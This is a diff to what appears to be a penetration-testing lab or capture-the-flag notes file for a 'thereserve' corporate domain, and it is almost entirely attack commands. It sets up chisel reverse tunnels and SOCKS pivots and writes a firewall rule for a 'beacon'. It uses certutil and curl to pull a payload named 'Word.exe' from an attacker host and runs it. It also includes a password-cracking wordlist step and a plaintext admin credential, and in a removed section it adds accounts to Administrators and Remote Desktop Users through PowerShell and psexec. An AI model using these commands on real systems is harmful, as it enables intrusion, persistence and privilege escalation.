@@ -91,7 +91,6 @@ nohup ./chisel client 10.50.114.111:20000 20001:127.0.0.1:20000 &
 // 01-09 for individual VPN client pivots, socks, fowards
 nohup ./chisel client 10.50.114.111:20000 R:127.0.01:20002:socks &
 
-
 // 11-19 for individual * client pivots 
 
 nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &
@@ -132,7 +131,6 @@ cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
 ```bash
 # http://10.200.121.12/
 mohammad.ahmed@corp.thereserve.loc
-
 ```
 
 The play-by-play copy and paste 
@@ -191,9 +189,9 @@ curl http://10.50.114.111:8443/VPN/VPN-update -o VPN-update
 # As root
 nohup ./VPN-update &
 
-# As www-data
+# From AB
 ./chisel server -host 10.50.114.111 -p 20000 --reverse --socks5 -v
-# On the VPN
+# As www-data on the VPN
 chmod +x *
 nohup ./chisel client 10.50.114.111:20000  R:20001:socks &
 # comment sock4 ... and add to /etc/proxychains4.conf:
@@ -230,10 +228,15 @@ netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow pr
 # Beacon Drop
 # Either
 certutil.exe -urlcache -split -f http://10.50.114.111:8443/DC1/Word.exe Word.exe
-
 # Share
 impacket-smbserver share $(pwd) -smb2support
 xcopy \\10.50.114.111\Share\Word.exe .
+.\Word.exe
+
+
+
+
+
 
 
 # Linux beacon for later
@@ -281,47 +284,3 @@ nohup nmap -sC -sV -p- 10.200.117.0/24 -oN vpn-free-lunch-sc-sv --min-rate 2000 
 ```
 
 
-Did not work :(
-```powershell
-$user = "NVMthisAccount"
-$pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"
-$cred = new-object -typename system.management.automation.pscredential($user,$pass)
-
-$session = new-pssession -computername wrk1 -credential $cred
-enter-pssession -session $sessions
-# Sometimes you need to use invoke command instead of $session creation due to shell limitations
-invoke-command -computername $computername -ScriptBlock { hostname }  -Credential $cred
-
-
-psexec \\WRK1 -u $user -p $pass net localgroup Administrators "corp.thereserve\$user"
-
-# https://www.powershellbros.com/add-users-to-local-group-remotely-using-powershell/ thx 
-# Remove the ` 
-xsel -b | sed 's@`@@g'
-
-$Computername = "PC01"
-$Username = "Account1"
-$GroupName = "Event Log Readers"
-$DomainName = $env:USERDOMAIN
-$Group = [ADSI]"WinNT://$ComputerName/$GroupName,group"
-$User = [ADSI]"WinNT://$DomainName/$Username,user"
-$Group.Add($User.Path)
-
-# Then repeatively till all flags I mine
-$Computername = "WRK1"
-$Computername = "SERVER1"
-# Change:
-$GroupName = "Administrators"
-$GroupName = "Remote Desktop Users"
-$GroupName = "Event Log Readers"
-
-$Username = "NVMthisAccount"
-$DomainName = $env:USERDOMAIN
-
-
-$Group = [ADSI]"WinNT://$ComputerName/$GroupName,group"
-$User = [ADSI]"WinNT://$DomainName/$Username,user"
-$Group.Add($User.Path)
-
-Invoke-Command $ComputerName -scriptblock{param($GroupName) net localgroup $GroupName $Username /add } -arg $GroupName | Where-Object {$_ -AND $_ -notmatch "command completed successfully"} | select -skip 4
-```
